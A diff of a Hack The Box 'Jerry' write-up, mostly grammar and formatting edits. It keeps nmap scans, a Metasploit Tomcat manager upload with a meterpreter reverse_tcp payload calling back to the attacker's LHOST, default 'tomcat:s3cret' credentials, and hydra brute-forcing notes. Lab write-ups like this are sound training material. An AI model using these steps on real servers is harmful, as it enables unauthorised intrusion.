@@ -1,18 +1,14 @@
----
-title: "Hack The Box - Jerry"
-date: 2023-10-22
----
 ## Description
 Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.
 ## Information gathering
-Let's by an nmap scan of the TCP ports:
+Let's run a nmap scan of the TCP ports:
 ```
 $nmap -p- 10.129.136.9
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-01 19:43 CEST
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 Nmap done: 1 IP address (0 hosts up) scanned in 3.06 seconds
 ```
-Ping seems blocked so I will try again with `-Pn` as suggested:
+Ping seems blocked, so I will try again with `-Pn` as suggested:
 ```
 $nmap -Pn -p- -oN nmap  10.129.136.9
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-01 19:44 CEST
@@ -125,7 +121,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.34 seconds
 No UDP ports seem open.
 ## Vulnerability assessment
 ### nmap scan
-Let's start by looking at any known vulnerabilities for Apache Tomcat/7.0.88. First of all, let's see if nmap is able to find something:
+Let's start by looking at any known vulnerabilities for Apache Tomcat/7.0.88. First, let's see if nmap is able to find something:
 ```
 $nmap -Pn -p8080 --script vuln -oN nmap_vuln 10.129.136.9
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-03 19:06 CEST
@@ -162,7 +158,7 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 109.18 seconds
 ```
-nmap returns only a DOS vulnerability which is not interesting in our case.
+`nmap` returns only a DOS vulnerability which is not interesting in our case.
 ### Apache Tomcat CVEs
 Let's look at the CVEs. It seems to have an important [list of vulnerabilities](https://www.cybersecurity-help.cz/vdb/apache_foundation/apache_tomcat/7.0.88/), specially two RCEs: [CVE-2020-9484](https://www.cybersecurity-help.cz/vulnerabilities/28158/) and [CVE-2019-0232](https://www.cybersecurity-help.cz/vulnerabilities/18236/).
 The second vulnerability is only exploitable on Windows. Let's use nmap to check the target OS:
@@ -185,7 +181,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.06 seconds
 It is very likely that the OS is Windows and so make this vulnerability exploitable. Moreover, it seems to exist an MSF exploit available on [exploit-db](https://www.exploit-db.com/exploits/47073). However, it requires a CGI script to exploit the vulnerability.
 The first vulnerability is on file upload and there is no upload form is what we list before.
 ### Deprecated API
-Another interesting issue could be the examples using the deprecated API but I have not been able to find any exploitable vulnerability.
+Another interesting issue could be the examples using the deprecated API, but I have not been able to find any exploitable vulnerability.
 ### Manager application
 It is possible to upload a WAR application on the server and MetaSploit has an exploit for that: `exploit/multi/http/tomcat_mgr_upload`.
 ## Exploitation
@@ -259,7 +255,7 @@ References:
 
 View the full module info with the info -d command.
 ```
-We saw that the target is running on Windows so we need to change it:
+We saw that the target is running on Windows, so we need to change it:
 ```
 [msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set target 1
 target => 1
@@ -290,7 +286,7 @@ payload => windows/meterpreter/reverse_tcp
 [*] Undeployed at /manager/html/undeploy
 [*] Exploit completed, but no session was created.
 ```
-It is better but not enough. Indeed, I forget to configure LHOST:
+It is better but not enough. Indeed, I forget to configure `LHOST`:
 ```
 [msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set LHOST tun0
 LHOST => 10.10.14.45
@@ -335,17 +331,17 @@ user.txt
 root.txt
 0[...SNIP...]e
 ```
-What a surprise! Both flags are here. No privelege escalation required for this machine!
+What a surprise! Both flags are here. No privilege escalation required for this machine!
 ## Learning from other writeups
 ### Official writeup
-To scan the opened ports, `masscan` is used. Apparently, it is faster than `nmap`. It can be an idea to use it, specifically for a big network, not a single machine. In this writeup, MetaSploit is not used. This is interesting to see how to create a WAR file from scratch. It seems to be just a jsp page that is archived using the command `jar -cvf ../wshell.war *`. They use another post-exploitation tool: [SILENTTRINITY](https://github.com/byt3bl33d3r/SILENTTRINITY).
+To scan the opened ports, `masscan` is used. Apparently, it is faster than `nmap`. It can be an idea to use it, specifically for a big network, not a single machine. In this writeup, MetaSploit is not used. This is interesting to see how to create a WAR file from scratch. It seems to be just a `jsp` page that is archived using the command `jar -cvf ../wshell.war *`. They use another post-exploitation tool: [`SILENTTRINITY`](https://github.com/byt3bl33d3r/SILENTTRINITY).
 Looking at the [video walkthrough](https://www.youtube.com/watch?v=PJeBIey8gc4), this is interesting to note how to intercept queries using `FoxyProxy` Firefox plugin and `BurpSuite`. Nothing essential for this box but still interesting to note.
-For the bruteforce, `hydra` is used and this tool has a `-C` option which can take a file where each line contains credentials on the format `user:pass`. This is the format of the wordlist `Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt` of SecLists.
-Another interesting stuff with `hydra` is the use of the `HYDRA_PROXY_HTTP` to send all of the queries to `BurpSuite` and get the history in that tool. I bet it can work with `OWASP ZAP` too.
+For the bruteforce, `hydra` is used, and this tool has a `-C` option which can take a file where each line contains credentials on the format `user:pass`. This is the format of the wordlist `Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt` of `SecLists`.
+Another interesting stuff with `hydra` is the use of the `HYDRA_PROXY_HTTP` to send all the queries to `BurpSuite` and get the history in that tool. I bet it can work with `OWASP ZAP` too.
 `msfvenom` can be used to generate payloads in a bunch of different formats. `war` format is supported. Then, MetaSploit is used to run a multi handler exploit. It could be interesting to learn more about that in the future.
 ### 0xdf writeup
 The writeup is available [here](https://0xdf.gitlab.io/2018/11/17/htb-jerry.html). The "Beyond Root" section goes deeper inside the exploit generated by `msfvenom`.
 ### rana-khalil writeup
-The writeup is available [here](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/jerry-writeup-w-o-metasploit). He uses a home-made script [`nmapAutomator`](https://github.com/rkhal101/nmapAutomator) to automate the enumeration. This script uses `nikto` that I does not know: it is a vulnerability scanner looking for dangerous files and outdated server softwares. This is interesting because this tool directly found that the manager was protected with default credentials `tomcat:s3cret`.
+The writeup is available [here](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/jerry-writeup-w-o-metasploit). He uses a home-made script [`nmapAutomator`](https://github.com/rkhal101/nmapAutomator) to automate the enumeration. This script uses `nikto` that I does not know: it is a vulnerability scanner looking for dangerous files and outdated server software programs. This is interesting because this tool directly found that the manager was protected with default credentials `tomcat:s3cret`.
 ## Lessons learned
-I lost a lot of time because I considered that we cannot have the credentials for the manager. I think I should take more time in the information gathering to look at the existing tools to enumerate users, find credentials... It may be interesting to take a deeper look at the auxiliary tools of MetaSploit. It will be also interesting to look at the features of `nikto`. Then, to simplify the enumeration, I may use `nmapAutomator` but I prefer to not use it right now in order to continue to understand the tools that I am using.
+I lost a lot of time because I considered that we cannot have the credentials for the manager. I think I should take more time in the information gathering to look at the existing tools to enumerate users, find credentials... It may be interesting to take a deeper look at the auxiliary tools of MetaSploit. It will be also interesting to look at the features of `nikto`. Then, to simplify the enumeration, I may use `nmapAutomator`, but I prefer to not use it right now in order to continue to understand the tools that I am using.
